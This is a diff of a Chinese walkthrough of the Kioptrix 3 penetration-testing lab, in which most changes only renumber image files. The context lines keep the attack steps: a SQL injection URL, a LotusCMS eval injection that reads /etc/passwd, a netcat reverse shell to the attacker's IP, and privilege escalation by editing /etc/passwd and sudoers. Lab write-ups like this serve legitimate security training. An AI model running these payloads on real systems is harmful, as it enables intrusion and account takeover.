@@ -89,11 +89,11 @@ Progress: 2245 / 3025 (74.21%)
 
 先用浏览器访问web的80端口，首页，blog，登录页，这个页面有提到CMS，查看一下网页源码发现是LotusCMS
 
-<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
 
 查看发现有两篇博客，第一个发现有一个目录，第二个在这里我们看到 Ligoat 雇佣了一名新员工，他们似乎用他的用户名来称呼他：loneferret。
 
-<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
 
 还注意到可以在博客文章上留下评论，这可能会在以后提供潜在的攻击媒介。现在，继续枚举图库应用程序。
 
@@ -101,7 +101,7 @@ Progress: 2245 / 3025 (74.21%)
 
 我们找到一个基本的图片库应用程序
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 标题将此页面称为“Gallarific”，消息来源证实这似乎是该应用程序的名称：
 
@@ -113,7 +113,7 @@ Progress: 2245 / 3025 (74.21%)
 
 这是一个常见的登录页面，尝试用一些常见的SQLI，并没有什么作用，尝试其它的方法
 
-<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
 
 ### 初步利用:
 
@@ -172,19 +172,19 @@ http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_co
 
 这里返回了一个登录凭证
 
-<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>
 
 我这边还没有找到这个程序的登录窗口，这边查看网页源码查找一下，发现这有个跳转
 
-<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
 访问它一下，跳转到了登录页面
 
-<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
 
 现在可以使用登录凭据登录这个应用程序
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 之前用gobuster扫描的时候发现有一个phpmyadmin的页面，设这边使用SQL注入进一步查找登录凭证，
 
@@ -196,21 +196,21 @@ http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_co
 
 这里查询到了有用的信息
 
-<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
 
 我们可以尝试用jhon来破解这个hashcat，我们还可以通过google来查询是否已存在这个哈希的正解，我将添加`-kioptrix`到查询中，以尽量避免任何特定于 Kioptrix 的剧透
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 这样我们就获得了一个phpmyadmin的一个登录凭证，root:fuckeyou通过搜索服务器，我们在`gallery`数据库中发现了一个有趣的表：`dev_accounts`。使用该`SQL`选项卡运行查询并转储表的内容。我们发现更多的哈希值：
 
-<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
 
 现在我们可以将它们放入 CrackStation 并找到明文凭证：
 
 {% embed url="https://crackstation.net/" %}
 
-<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
 
 ### 进一步漏洞利用：
 
@@ -250,11 +250,11 @@ http://192.168.40.132/index.php?page=index');${system('cat /etc/passwd')};#
 
 这里错误，文件中的第 26 行执行了一个 eval() 函数，但在执行过程中发生了语法错误,我们需要对payload进行url编码再进行尝试
 
-<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
 payload编码后重新发送请求，命令成功执行了
 
-<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
 
 生成nc反向shell再次发送请求，将以下payload进行url编码，攻击机监听8886
 
@@ -262,7 +262,7 @@ payload编码后重新发送请求，命令成功执行了
 index');${system('nc -c bash 192.168.40.131 8886')};#
 ```
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
 
 可以看到返回一个www-data的一个用户，继续看下有什么有用的信息，先获取一个交互式的 Bash Shell
 
@@ -386,7 +386,7 @@ export TERM=xterm
 
 现在`sudo ht`启动编辑器。打开`/etc/passwd`文件，然后（**重要**）将副本保存在安全的地方，alt+f，选择F3那个打开/etc/passwd文件，开始编辑
 
-<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
 
 我们现在要做的是生成密码哈希并将其提供给`games`用户。要创建哈希，我们可以使用以下`openssl`工具：
 
@@ -431,7 +431,7 @@ $
 games ALL=NOPASSWD: ALL
 ```
 
-<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 回到我们的 SSH 会话，`sudo`再次检查我们的权限。
 
